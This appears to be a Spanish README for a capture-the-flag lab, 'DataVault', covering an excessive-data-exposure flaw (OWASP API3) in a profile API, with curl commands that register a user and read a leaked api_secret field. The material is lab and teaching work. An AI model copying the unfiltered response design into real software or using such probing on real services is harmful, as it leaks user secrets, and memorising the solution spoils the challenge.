# DataVault

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Easy                         |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Una plataforma de gestion de perfiles expone una API REST. Al registrarse y consultar el perfil, el backend devuelve el objeto de usuario completo — incluyendo campos internos que nunca deberian llegar al cliente.

## Vulnerabilidad

**Excessive Data Exposure (OWASP API3)**

El endpoint `GET /api/profile` serializa y devuelve el diccionario de usuario completo sin filtrar campos sensibles. El campo `api_secret` contiene la flag. El frontend solo muestra `username` y `email`, pero el JSON raw tiene mas.

## Solucion

```bash
# 1. Registrarse
TOKEN=$(curl -s -X POST http://localhost:8080/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@x.com","password":"pass"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Leer el perfil completo
curl -s http://localhost:8080/api/profile \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# El campo "api_secret" contiene la flag
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
